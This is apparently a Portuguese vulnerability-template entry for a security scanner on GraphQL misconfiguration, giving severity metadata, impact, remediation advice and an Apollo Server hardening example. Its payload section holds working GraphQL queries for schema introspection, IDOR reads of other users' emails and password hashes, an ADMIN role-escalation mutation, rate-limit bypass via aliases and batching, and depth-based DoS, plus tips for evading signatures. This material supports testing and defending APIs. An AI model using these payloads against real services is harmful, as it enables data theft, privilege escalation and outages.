---
id: graphql_misconfiguration
title: "GraphQL Misconfiguration"
module: "graphql"
severity: "HIGH"
cwe_id: "CWE-200"
cwe_title: "Exposure of Sensitive Information to an Unauthorized Actor"
cvss_vector: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
vrt_id: "server_security_misconfiguration.graphql_misconfiguration"
---

## Summary
Endpoints GraphQL expõem introspection, sugestões de campos, batching sem limite e autorização por campo ausente, permitindo mapear o schema, abusar de IDOR e causar negação de serviço.

## Description
GraphQL oferece um único endpoint que aceita queries arbitrárias. Se a autorização é aplicada apenas no endpoint e não em cada resolver/campo, um usuário autenticado pode consultar dados de outros usuários, acessar campos administrativos ou executar mutações não previstas. Introspection habilitada em produção revela tipos, campos, mutations e argumentos; field suggestions ajudam a descobrir nomes quando introspection está desabilitada.

Riscos adicionais:
- **Batching/aliasing:** múltiplas operações em uma requisição para brute force, enumerar IDs ou contornar rate limit.
- **Query depth/complexity:** queries profundas ou recursivas causam DoS.
- **IDOR em `node(id:)`:** IDs globais opacos podem ser decodificados e manipulados.
- **Mutations sem autorização:** alteração de perfil, role, e-mail, senha e recursos de outros usuários.
- **Debug/GraphiQL expostos:** playground, IDE e erros detalhados.
- **Persisted queries não obrigatórias:** permite queries arbitrárias.

## Impact
- Mapeamento completo do schema e da superfície de ataque.
- Vazamento de dados sensíveis e PII de outros usuários/tenants.
- Escalada de privilégios via mutations e campos administrativos.
- Bypass de rate limit e enumeração massiva com batching.
- Negação de serviço por queries custosas.
- Impacto HIGH; pode ser CRITICAL se houver account takeover ou dump de dados.

## Payloads and Bypasses
```graphql
# Introspection completa
{ __schema { types { name kind fields { name type { name kind ofType { name kind } } } } } }

# Tipos e campos
{ __type(name: "User") { name fields { name type { name } } } }

# Field suggestions (quando introspection está off)
{ usr }

# Consulta de outro usuário (IDOR)
{ user(id: "123") { id email role passwordHash } }

# Node interface
{ node(id: "VXNlcjoxMjM=") { ... on User { id email role } } }

# Aliases para enumeração / bypass de rate limit
{
  u1: user(id: "1") { email }
  u2: user(id: "2") { email }
  u3: user(id: "3") { email }
}

# Batching (array de operações)
[
  {"query":"{ user(id:\"1\"){email} }"},
  {"query":"{ user(id:\"2\"){email} }"},
  {"query":"{ user(id:\"3\"){email} }"}
]

# Mutation administrativa
mutation { updateUser(id: "123", input: { role: "ADMIN" }) { id role } }

# Depth / DoS
{ user(id:"1") { friends { friends { friends { friends { friends { id } } } } } } }
```

Requisições:
```bash
curl -s https://alvo.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { types { name } } }"}'

curl -s https://alvo.com/graphql -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <token>' \
  -d '{"query":"{ user(id:\"2\") { id email role } }"}'
```

Bypasses e variações:
```text
- GET com query na URL (?query=...)
- Content-Type: application/graphql
- Introspection parcial: __type, __schema, __typename
- Aliases com nomes aleatórios para evitar assinaturas
- Fragmentos para montar queries sem palavras bloqueadas
- Persisted query hash manipulation
- Batching via array, multipart ou JSON Lines
- Enumerar IDs sequenciais, UUIDv1 e IDs base64
```

Casos reais e mentalidade de ataque (RWBH): GitHub (IDOR via `node`) e Shopify (introspection) mostram que o endpoint único concentra autorização, enumeração e batching; o atacante começa pelo schema e depois testa cada resolver.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `query`, `variables`, `operationName`, `id`, `nodeId`, `input`, `filter`, `first`, `after`, `orderBy`.
- **Paths comuns:** `/graphql`, `/api/graphql`, `/v1/graphql`, `/graphiql`, `/playground`, `/api/v1/graphql`, `/query`.
- **Sinais:** `__schema` acessível; mensagens "Did you mean"; erros com stack trace; endpoint aceita GET; playground habilitado; batching sem limite.

## Recommendation
1. Desabilitar introspection e GraphiQL/playground em produção; se necessário, restringir a usuários internos.
2. Desabilitar field suggestions e mensagens de erro detalhadas em produção.
3. Aplicar autorização em cada resolver/campo, com verificação de ownership e tenant; não confiar apenas no token.
4. Implementar allowlist de queries persistidas ou depth/complexity limits; rejeitar queries acima do custo máximo.
5. Limitar batching, aliases e tamanho do body; aplicar rate limit por usuário/IP e por operação.
6. Validar e não expor IDs internos; usar IDs opacos e verificar autorização ao resolver `node(id:)`.
7. Desabilitar mutations administrativas para roles não privilegiadas e auditar alterações.
8. Exemplo de proteção (Apollo Server):
```js
const server = new ApolloServer({
  typeDefs, resolvers,
  introspection: false,
  validationRules: [depthLimit(7), createComplexityLimitRule(1000)],
  plugins: [ApolloServerPluginLandingPageDisabled()],
});
```
9. Monitorar queries anômalas, picos de complexidade e enumeração de IDs.
